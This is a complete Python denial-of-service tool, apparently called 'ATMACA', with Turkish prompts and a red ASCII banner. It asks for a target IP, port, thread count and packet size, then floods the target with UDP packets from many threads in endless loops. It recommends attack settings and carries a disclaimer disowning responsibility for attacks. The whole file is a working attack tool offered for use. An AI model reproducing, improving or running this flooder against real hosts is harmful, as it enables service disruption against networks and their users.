import socket
import threading

GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'
BLUE = '\033[94m'
WHITE = '\033[97m'
YELLOW = '\033[33m.'
RED = "\033[91m"
RESET = "\033[0m"

print(f"{BLUE}-nosystemistsafe tarafından geliştirilmiştir-{RESET}")
print(f"""{BLUE}
"Atmaca, ROKETSAN yapımı bir Türk güdümlü mermisidir. Deniz Sistemleri içinde kullanılır. Menzili 220km'dir. ATMACA programının ismi oradan gelmektedir."
{RESET}""")

print(f"{RED}                                      .         .                                                                 {RESET}")
print(f"{RED}         .8.    8888888 8888888888   ,8.       ,8.                   .8.           ,o888888o.           .8.          {RESET}")
print(f"{RED}        .888.         8 8888        ,888.     ,888.                 .888.         8888     `88.        .888.         {RESET}")
print(f"{RED}       :88888.        8 8888       .`8888.   .`8888.               :88888.     ,8 8888       `8.      :88888.        {RESET}")
print(f"{RED}      . `88888.       8 8888      ,8.`8888. ,8.`8888.             . `88888.    88 8888               . `88888.       {RESET}")
print(f"{RED}     .8. `88888.      8 8888     ,8'8.`8888,8^8.`8888.           .8. `88888.   88 8888              .8. `88888.      {RESET}")
print(f"{RED}    .8`8. `88888.     8 8888    ,8' `8.`8888' `8.`8888.         .8`8. `88888.  88 8888             .8`8. `88888.     {RESET}")
print(f"{RED}   .8' `8. `88888.    8 8888   ,8'   `8.`88'   `8.`8888.       .8' `8. `88888. 88 8888            .8' `8. `88888.    {RESET}")
print(f"{RED}  .8'   `8. `88888.   8 8888  ,8'     `8.`'     `8.`8888.     .8'   `8. `88888.`8 8888       .8' .8'   `8. `88888.   {RESET}")
print(f"{RED} .888888888. `88888.  8 8888 ,8'       `8        `8.`8888.   .888888888. `88888.  8888     ,88' .888888888. `88888.  {RESET}")
print(f"{RED}.8'       `8. `88888. 8 8888,8'         `         `8.`8888. .8'       `8. `88888.  `8888888P'  .8'       `8. `88888. {RESET}")


print(f"{BLUE}Lütfen sorumlulukla kullanınız. Bu program kullanılarak yapılan hiç bir saldırıdan ben (yapımcı) sorumlu değilim. Önerilen iş parçacığı sayısı = 100. Önerilen veri boyutu = 5000 veya 6000. Dikkatli kullanın. Kendi bilgisayarınıza veya internetinize zarar vermeyin. Eğer bilgisayarınız güçlüyse önerilen sayıları artırabilirsiniz. Eğer bilgisayarınız güçsüzse veya internetiniz çok kötüyse önerilen sayıları azaltarak kullanın.{RESET}\n")

target_ip = input(f"{GREEN}Hedefin IP adresini giriniz: {RESET}")
target_port = int(input(f"{GREEN}Hedef portu giriniz: {RESET}"))

thread_count = int(input(f"{GREEN}İş parçacığı sayısını giriniz: {RESET}"))
data_size = int(input(f"{GREEN}Gönderilecek veri boyutunu giriniz (bayt cinsinden): {RESET}"))

data = ' ' * data_size

def flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            sock.sendto(data.encode(), (target_ip, target_port))
            print(f"{WHITE}Ping gönderildi: {target_ip}:{target_port} - Veri boyutu: {data_size} bayt{RESET}")
        except Exception as e:
            print(f"{YELLOW}Hata: {e}{RESET}")
            break

threads = []
for _ in range(thread_count):
    thread = threading.Thread(target=flood)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
